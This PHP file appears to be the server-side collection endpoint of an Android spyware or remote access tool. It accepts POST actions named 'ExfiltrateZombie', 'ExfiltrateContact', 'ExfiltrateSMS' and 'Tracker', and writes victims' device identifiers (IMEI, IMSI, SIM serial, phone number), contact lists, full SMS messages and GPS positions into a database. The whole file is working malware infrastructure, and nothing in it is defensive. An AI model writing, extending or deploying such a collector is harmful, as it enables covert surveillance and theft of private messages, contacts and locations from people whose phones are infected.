#    Copyright (C) 2015 Alexandre Teyar

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License. 

<?php
	$host = "localhost";
	$username = "";
	$password = "";
	$db = "SCI";

	$conn = mysqli_connect($host, $username, $password, $db);
	$conn->set_charset('utf8');

	if (!$conn) {
		die(mysqli_connect_error());
	}

	if (!empty($_POST['action']) && !empty($_POST['data'])) {
		$action	= urldecode($_POST['action']);
		$data 	= json_decode(urldecode($_POST['data']), true);

		switch ($action) {
            case "ExfiltrateZombie":
            	insertZombie($conn, $data);
                break;

            case "ExfiltrateContact":
                insertContact($conn, $data);
                break;

            case "ExfiltrateSMS":
                insertSMS($conn, $data);
                break;

            case "Tracker":
                insertPosition($conn, $data);
                break;

            default:
                http_response_code(400);
                break;
        }
	}	

	function insertZombie($conn, $data) {
		$statement = $conn->prepare("INSERT IGNORE INTO `Zombie` (`email_addresses`, `deviceSerial`, `IMEI`, `IMSI`, `manufacturer`, `MCC-MNC`, `model`, `number`, `release`, `simSerial`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");

		if ($statement) {
			$statement->bind_param(
				"ssssssssss", 
				implode(", ", $data["email_addresses"]), 
				$data["device"]["serial"], 
				$data["device"]["IMEI"], 
				$data["SIM"]["IMSI"],
				$data["device"]["manufacturer"], 
				$data["SIM"]["MCC-MNC"], 
				$data["device"]["model"], 
				$data["SIM"]["number"], 
				$data["device"]["release"],
				$data["SIM"]["serial"]
			);

			$result = $statement->execute();

			if($result) {
				$statement->close();
			} else {
				trigger_error($statement->error);
				die($statement->error);	
			}
		} else {
			trigger_error($conn->error);
    		die($conn->error);
		}
	}

	function insertContact($conn, $data) {
		$statement = $conn->prepare("INSERT IGNORE INTO `Contact` (`id`, `email_addresses`, `display_name`, `normalized_number`) VALUES (?, ?, ?, ?)");

		if ($statement) {
			foreach ($data as $contact) {
				$statement->bind_param(
					"isss", 
					$contact["id"], 
					implode(", ", $contact["email_addresses"]), 
					$contact["display_name"], 
					$contact["normalized_number"]
				);

				$result = $statement->execute();

				if(!$result) {	
					die($statement->error);	
				}
			}

			$statement->close();
		} else {
    		die($conn->error);
		}		
	}

	function insertSMS($conn, $data) {
		$statement = $conn->prepare("INSERT IGNORE INTO `SMS` (`id`, `email_addresses`, `address`, `body`,  `date`, `thread_id`, `type`) VALUES (?, ?, ?, ?, ?, ?, ?)");

		if ($statement) {
			foreach ($data as $SMS) {
				$statement->bind_param(
					"isssssi", 
					$SMS["id"], 
					implode(", ", $SMS["email_addresses"]), 
					$SMS["address"],
					$SMS["body"],
					$SMS["date"],
					$SMS["thread_id"],  
					$SMS["type"] 
				);

				$result = $statement->execute();
			
				if(!$result) {	
					die($statement->error);	
				}
			}

			$statement->close();
		} else {
    		die($conn->error);
		}	
	}

	function insertPosition($conn, $data) {
		$statement = $conn->prepare("INSERT IGNORE INTO Position (`email_addresses`, `accuracy`, `altitude`, `date`, `latitude`, `longitude`, `provider`) VALUES (?, ?, ?, ?, ?, ?, ?)");

		if ($statement) {
			$statement->bind_param(
				"sddsdds",
				$data["email_addresses"], 
				$data["accuracy"], 
				$data["altitude"],
				$data["date"], 
				$data["latitude"], 
				$data["longitude"],
				$data["provider"]
			);

			$result = $statement->execute();

			if($result) {	
				$statement->close();
			} else {
				die($statement->error);	
			}
		} else {
    		die($conn->error);
		}
	}

	mysqli_close($conn);
?>
